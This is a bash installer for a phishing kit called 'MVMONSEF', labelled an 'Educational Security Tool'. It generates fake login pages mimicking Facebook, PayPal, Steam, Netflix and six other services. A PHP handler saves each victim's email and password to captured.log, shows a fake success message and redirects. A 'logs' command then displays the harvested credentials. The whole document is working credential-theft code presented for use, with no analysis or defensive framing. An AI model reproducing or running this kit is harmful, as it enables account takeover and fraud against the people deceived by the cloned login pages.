cat > install.sh << 'EOF'
#!/bin/bash

# Colors
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

clear
echo -e "${GREEN}"
echo " ███╗   ███╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗███████╗"
echo " ████╗ ████║██║   ██║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔════╝"
echo " ██╔████╔██║██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗███████╗"
echo " ██║╚██╔╝██║██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║╚════██║"
echo " ██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████║███████║"
echo " ╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝"
echo -e "${CYAN}           Educational Security Tool - Installation${NC}"
echo -e "${YELLOW}=========================================================${NC}"
echo ""

# Check dependencies
echo -e "${CYAN}[${GREEN}+${CYAN}] ${WHITE}Checking dependencies...${NC}"

if ! command -v php &> /dev/null; then
    echo -e "${RED}[!] PHP is not installed. Installing...${NC}"
    pkg install php -y
fi

echo -e "${GREEN}[✅] Dependencies checked${NC}"

# Create the main script
echo -e "${CYAN}[${GREEN}+${CYAN}] ${WHITE}Creating MVMONSEF tool...${NC}"

cat > monsef << 'SCRIPTEOF'
#!/bin/bash

# Colors
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Check if user wants to see logs
if [ "$1" = "logs" ]; then
    clear
    echo -e "${RED}"
    echo " ███╗   ███╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗███████╗"
    echo " ████╗ ████║██║   ██║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔════╝"
    echo " ██╔████╔██║██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗███████╗"
    echo " ██║╚██╔╝██║██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║╚════██║"
    echo " ██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████║███████║"
    echo " ╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝"
    echo -e "${CYAN}           Educational Security Tool${NC}"
    echo -e "${YELLOW}=================================================${NC}"
    echo -e "${GREEN}           Made by Monsef${NC}"
    echo ""
    echo -e "${BLUE}CAPTURED CREDENTIALS:${NC}"
    echo -e "${YELLOW}================================${NC}"
    
    if [ -f "captured.log" ]; then
        cat "captured.log"
    else
        echo -e "${RED}No credentials captured yet.${NC}"
    fi
    exit 0
fi

clear
echo -e "${RED}"
echo " ███╗   ███╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗███████╗"
echo " ████╗ ████║██║   ██║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔════╝"
echo " ██╔████╔██║██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗███████╗"
echo " ██║╚██╔╝██║██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║╚════██║"
echo " ██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████║███████║"
echo " ╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝"
echo -e "${CYAN}           Educational Security Tool${NC}"
echo -e "${YELLOW}=================================================${NC}"
echo -e "${GREEN}           Made by Monsef${NC}"
echo ""

# Kill any PHP servers
pkill -f "php -S" 2>/dev/null
sleep 2

echo -e "${CYAN}[${GREEN}+${CYAN}] ${WHITE}Select Template:${NC}"
echo ""
echo -e "${BLUE}  SOCIAL MEDIA:${NC}"
echo -e "${YELLOW}  1. Facebook${NC}        ${YELLOW}6. Instagram${NC}"
echo -e "${YELLOW}  2. Twitter${NC}         ${YELLOW}7. Snapchat${NC}"
echo ""
echo -e "${GREEN}  GAMES & PAYMENTS:${NC}"
echo -e "${YELLOW}  3. Steam${NC}           ${YELLOW}8. PlayStation${NC}"
echo -e "${YELLOW}  4. Xbox${NC}            ${YELLOW}9. PayPal${NC}"
echo -e "${YELLOW}  5. Discord${NC}         ${YELLOW}10. Netflix${NC}"
echo ""

read -p "$(echo -e "${CYAN}Select option (1-10): ${NC}")" choice

case $choice in
    1) template="Facebook"; color="#1877f2"; link="facebook-login" ;;
    2) template="Twitter"; color="#1da1f2"; link="twitter-login" ;;
    3) template="Steam"; color="#000000"; link="steam-login" ;;
    4) template="Xbox"; color="#107c10"; link="xbox-login" ;;
    5) template="Discord"; color="#5865f2"; link="discord-login" ;;
    6) template="Instagram"; color="#e4405f"; link="instagram-login" ;;
    7) template="Snapchat"; color="#fffc00"; link="snapchat-login" ;;
    8) template="PlayStation"; color="#003087"; link="playstation-login" ;;
    9) template="PayPal"; color="#0070ba"; link="paypal-login" ;;
    10) template="Netflix"; color="#e50914"; link="netflix-login" ;;
    *) echo -e "${RED}[!] Invalid option${NC}"; exit 1 ;;
esac

echo -e "${GREEN}[+] Selected: $template${NC}"

# Create the page with working credential capture (NO IP)
cat > index.php << PHPEOF
<?php
// Hide errors
error_reporting(0);

if(\\$_SERVER['REQUEST_METHOD'] == 'POST') {
    \\$email = \\$_POST['email'] ?? '';
    \\$password = \\$_POST['password'] ?? '';
    
    if(!empty(\\$email) && !empty(\\$password)) {
        // Save credentials to file (NO IP)
        \\$log_data = "[" . date('Y-m-d H:i:s') . "] SITE: $template | EMAIL: \\$email | PASSWORD: \\$password\\n";
        file_put_contents('captured.log', \\$log_data, FILE_APPEND | LOCK_EX);
        
        // Show success page
        echo "<!DOCTYPE html>
        <html>
        <head>
            <title>Login Successful</title>
            <style>
                body { 
                    background: #f5f5f5;
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    text-align: center;
                }
                .success-box {
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
                    width: 350px;
                }
            </style>
        </head>
        <body>
            <div class='success-box'>
                <h2 style='color: green;'>✓ Login Successful!</h2>
                <p>Welcome back to $template!</p>
                <p>Redirecting to your account...</p>
            </div>
            <script>
                setTimeout(function() {
                    window.location = 'https://facebook.com';
                }, 3000);
            </script>
        </body>
        </html>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Log in to your <?php echo "$template"; ?> account</title>
    <style>
        body { 
            background: <?php echo "$color"; ?>;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            width: 350px;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
            color: <?php echo "$color"; ?>;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: <?php echo "$color"; ?>;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        .forgot-password {
            margin-top: 15px;
            font-size: 14px;
            color: <?php echo "$color"; ?>;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo"><?php echo "$template"; ?></div>
        <form method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
    </div>
</body>
</html>
PHPEOF

echo -e "${GREEN}[+] $template login page created${NC}"
echo -e "${YELLOW}[+] Starting server on port 8080...${NC}"
echo -e "${CYAN}[+] URL: http://localhost:8080/$link${NC}"
echo -e "${PURPLE}[+] Credentials automatically save to: captured.log${NC}"
echo -e "${BLUE}[+] View captured data with: monsef logs${NC}"
echo -e "${RED}[!] Press Ctrl+C to stop${NC}"
echo ""

# Start server
php -S 127.0.0.1:8080
SCRIPTEOF

# Make executable and install
chmod +x monsef
mv monsef $PREFIX/bin/

echo -e "${GREEN}[✅] MVMONSEF INSTALLED SUCCESSFULLY!${NC}"
echo -e "${CYAN}[?] Usage: monsef (start tool) OR monsef logs (view captured data)${NC}"
EOF
